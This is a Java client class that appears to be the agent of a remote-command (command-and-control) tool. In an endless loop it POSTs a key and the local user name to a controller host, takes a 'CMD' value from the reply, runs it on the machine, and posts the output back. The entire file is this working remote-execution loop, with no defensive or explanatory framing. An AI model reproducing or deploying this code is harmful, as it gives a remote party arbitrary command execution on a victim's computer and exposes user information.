import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class Client extends Service{
    Client(){
    }
    Client(String KEY){
        setKEY(KEY);
    }
    Client(String KEY, int timeDelay){
        setKEY(KEY);
        setTimeDelay(timeDelay);
    }
    Client(String KEY, String controllHost, String manageSection){
        setKEY(KEY);
        setControllHost(controllHost);
        setManageSection(manageSection);
    }
    Client(String KEY, String controllHost, String manageSection,int timeDelay){
        setKEY(KEY);
        setControllHost(controllHost);
        setManageSection(manageSection);
        setTimeDelay(timeDelay);
    }
    
    @Override
    public void start() throws Exception{
        //String KEY = "FHNLYSEPEZSGCRDZ";
        java.util.Scanner in = new java.util.Scanner(System.in);
        if(this.controllHost == null){
            System.out.println("ENTER THE ADDRESS");
            setControllHost(in.next());
            setManageSection("client.php");
        }
        if(this.KEY == null){
            System.out.println("ENTER THE PRESENT KEY OR PRESS ENTER TO REG");
            setKEY(in.next());
        }
        
        HTTPPost site = null;
        java.util.Map<String, String> Params = new java.util.HashMap<>();
        Params.put("KEY", this.KEY);
        Params.put("PCUser", System.getProperty("user.name"));
        String cmd = "";
        while(true){
            try{
                java.util.Map<String, String> params = new java.util.HashMap<>(Params);
                site = new HTTPPost(getAddr(), params, "POST");
                site.connect();
                String cmdOld = cmd;
                cmd = CMDExec.execute(site.getResponse(true).get("CMD"));
                if(cmdOld.equals(cmd) || cmd.equals("NORES")){
                    TimeUnit.MILLISECONDS.sleep(this.timeDelay);
                    continue;
                }
                site.close();
                params.put("CMDRes", cmd);
                site = new HTTPPost(getAddr(), params, "POST");
                site.connect();
                System.out.println(site.getResponse());
                TimeUnit.MILLISECONDS.sleep(this.timeDelay);
            }catch(IOException | InterruptedException e){
                e.printStackTrace();
                TimeUnit.MILLISECONDS.sleep(this.timeDelay);
            }
            finally{
                site.close();
            }
        }
    }
}
